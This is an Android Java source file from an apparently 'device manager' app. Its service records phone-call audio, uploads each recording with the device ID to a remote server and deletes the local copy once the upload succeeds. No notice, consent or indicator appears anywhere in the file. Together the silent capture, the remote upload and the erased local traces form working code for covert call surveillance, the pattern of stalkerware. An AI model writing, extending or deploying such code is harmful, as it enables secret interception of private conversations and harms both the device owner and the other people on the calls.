package com.company.devicemgr.services;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.os.IBinder;
import android.util.Log;

import com.company.devicemgr.utils.ApiConfig;
import com.company.devicemgr.utils.HttpClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallRecordingService extends Service {
    public static final String ACTION_START_RECORDING = "com.company.devicemgr.action.START_RECORDING";
    public static final String ACTION_STOP_RECORDING = "com.company.devicemgr.action.STOP_RECORDING";

    private static final String TAG = "CallRecordingSvc";
    private static final String PREFS = "devicemgr_prefs";
    private static final String KEY_QUEUE = "pending_call_recordings";

    private MediaRecorder recorder;
    private File currentFile;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = intent != null ? intent.getAction() : null;
        if (ACTION_START_RECORDING.equals(action)) {
            startRecording();
        } else if (ACTION_STOP_RECORDING.equals(action)) {
            stopRecording();
            flushQueueAsync();
            stopSelf();
        } else {
            flushQueueAsync();
        }
        return START_STICKY;
    }

    private void startRecording() {
        if (recorder != null) return;

        try {
            File folder = new File(getFilesDir(), "calls");
            if (!folder.exists()) folder.mkdirs();

            String ts = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            currentFile = new File(folder, "call_" + ts + ".m4a");
            int[] preferredSources = new int[]{
                    MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    MediaRecorder.AudioSource.MIC
            };

            Exception lastError = null;
            for (int source : preferredSources) {
                try {
                    recorder = new MediaRecorder();
                    recorder.setAudioSource(source);
                    recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                    recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                    recorder.setAudioChannels(1);
                    recorder.setAudioSamplingRate(44100);
                    recorder.setAudioEncodingBitRate(128000);
                    recorder.setOutputFile(currentFile.getAbsolutePath());
                    recorder.prepare();
                    recorder.start();
                    Log.i(TAG, "recording started: " + currentFile.getAbsolutePath() + " source=" + source);
                    return;
                } catch (Exception sourceError) {
                    lastError = sourceError;
                    safeRelease();
                }
            }
            throw lastError != null ? lastError : new IllegalStateException("no_audio_source_available");
        } catch (Exception e) {
            Log.e(TAG, "startRecording failed", e);
            safeRelease();
        }
    }

    private void stopRecording() {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.reset();
                recorder.release();
                recorder = null;

                if (currentFile != null && currentFile.exists() && currentFile.length() > 0) {
                    enqueueFile(currentFile.getAbsolutePath());
                }
                currentFile = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "stopRecording failed", e);
            safeRelease();
        }
    }

    private void safeRelease() {
        try {
            if (recorder != null) {
                recorder.reset();
                recorder.release();
            }
        } catch (Exception ignored) {}
        recorder = null;
    }

    private SharedPreferences prefs() {
        return getSharedPreferences(PREFS, MODE_PRIVATE);
    }

    private synchronized void enqueueFile(String path) {
        try {
            JSONArray arr = new JSONArray(prefs().getString(KEY_QUEUE, "[]"));
            arr.put(path);
            prefs().edit().putString(KEY_QUEUE, arr.toString()).apply();
        } catch (Exception e) {
            Log.e(TAG, "enqueueFile err", e);
        }
    }

    private void flushQueueAsync() {
        new Thread(this::flushQueue).start();
    }

    private synchronized void flushQueue() {
        try {
            String token = prefs().getString("auth_token", null);
            String deviceId = prefs().getString("deviceId", "unknown");
            if (token == null || token.length() == 0) return;

            JSONArray arr = new JSONArray(prefs().getString(KEY_QUEUE, "[]"));
            JSONArray pending = new JSONArray();

            for (int i = 0; i < arr.length(); i++) {
                String path = arr.optString(i, null);
                if (path == null) continue;
                File f = new File(path);
                if (!f.exists() || f.length() == 0) continue;

                try {
                    java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
                    java.io.FileInputStream fis = new java.io.FileInputStream(f);
                    byte[] buf = new byte[8192];
                    int n;
                    while ((n = fis.read(buf)) > 0) bos.write(buf, 0, n);
                    fis.close();
                    byte[] data = bos.toByteArray();

                    String url = ApiConfig.api("/api/media/" + deviceId + "/upload");
                    java.util.Map<String, String> form = new java.util.HashMap<>();
                    form.put("captureMode", "call_recording");
                    form.put("captureKind", "call_audio");
                    form.put("segmentStartedAtMs", String.valueOf(f.lastModified()));
                    form.put("segmentDurationMs", "0");
                    org.json.JSONObject metadata = new org.json.JSONObject();
                    metadata.put("source", "CallRecordingService");
                    metadata.put("transport", "audio_mp4");
                    metadata.put("capturedAtMs", f.lastModified());
                    form.put("metadataJson", metadata.toString());
                    String resp = HttpClient.uploadFile(url, "media", f.getName(), data, "audio/mp4", form, token);
                    JSONObject jo = new JSONObject(resp != null ? resp : "{}");
                    if (jo.optBoolean("ok", false)) {
                        boolean deleted = f.delete();
                        Log.i(TAG, "uploaded call file " + f.getName() + ", deleted=" + deleted);
                    } else {
                        pending.put(path);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "upload call failed", e);
                    pending.put(path);
                }
            }

            prefs().edit().putString(KEY_QUEUE, pending.toString()).apply();
        } catch (Exception e) {
            Log.e(TAG, "flushQueue err", e);
        }
    }

    @Override
    public void onDestroy() {
        stopRecording();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
